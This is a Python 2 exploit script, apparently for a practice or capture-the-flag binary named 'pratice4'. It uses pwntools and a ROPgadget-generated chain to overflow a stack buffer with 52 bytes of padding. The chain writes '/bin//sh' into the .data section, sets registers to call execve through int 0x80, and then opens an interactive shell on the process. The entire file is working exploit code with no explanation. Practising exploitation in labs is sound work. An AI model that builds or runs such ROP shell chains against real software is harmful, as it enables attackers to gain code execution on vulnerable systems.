#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack
from pwn import process

# Padding goes here
p = 'a'*52

p += pack('<I', 0x0806e94a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
#p += pack('<I', 0x080baf26) # pop eax ; ret
p += pack('<I', 0x80e1cc1) # pop eax ; ret
p += '/bin'
#p += pack('<I', 0x080a18cd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08065952) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e94a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
#p += pack('<I', 0x080baf26) # pop eax ; ret
p += pack('<I', 0x80e1cc1) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08065952) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e94a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054370) # xor eax, eax ; ret
#p += pack('<I', 0x080a18cd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08065952) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806e971) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806e94a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054370) # xor eax, eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x0807b39f) # inc eax ; ret
p += pack('<I', 0x080493f1) # int 0x80

r = process('./pratice4')
r.recvuntil('name ?')
r.sendline(p)
r.interactive()
